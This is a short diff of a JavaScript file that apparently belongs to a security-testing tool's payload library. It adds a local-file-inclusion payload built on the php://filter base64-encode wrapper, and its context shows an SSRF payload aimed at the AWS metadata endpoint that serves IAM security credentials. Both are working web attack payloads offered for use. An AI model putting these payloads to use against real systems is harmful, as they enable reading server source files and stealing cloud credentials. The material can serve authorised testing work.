@@ -263,6 +263,11 @@ window.Payload.XSS = {
   },
 }
 
+window.Payload.LFI = {
+  phpWrapperBas64: value =>
+    'php://filter/convert.base64-encode/resource=' + value,
+}
+
 window.Payload.SSRF = {
   awsRoleName: () =>
     'http://169.254.169.254/latest/meta-data/iam/security-credentials',
